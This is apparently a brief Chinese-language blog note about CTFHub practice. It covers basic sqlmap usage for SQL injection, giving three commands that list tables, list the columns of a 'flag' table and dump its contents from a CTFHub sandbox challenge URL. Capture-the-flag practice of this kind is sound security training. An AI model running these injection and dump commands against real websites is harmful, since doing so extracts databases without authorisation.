---
title: ctfhub.md
toc: true
recommend: 1
uniqueId: '2021-10-24 13:32:39/ctfhub.md.html'
mathJax: false
date: 2021-10-24 21:32:39
thumbnail:
tags:
categories:
keywords:
---
> 在ctfhub的一点一滴

<!-- more -->

## Sql注入

### sqlmap的基础用法

```shell
# 列出表名
python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 --tables
# 列出列名
python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag --columns
# 查数据
python sqlmap.py -u http://challenge-09b258a06d2a3854.sandbox.ctfhub.com:10080/?id=1 -T flag -C flag --dump
```

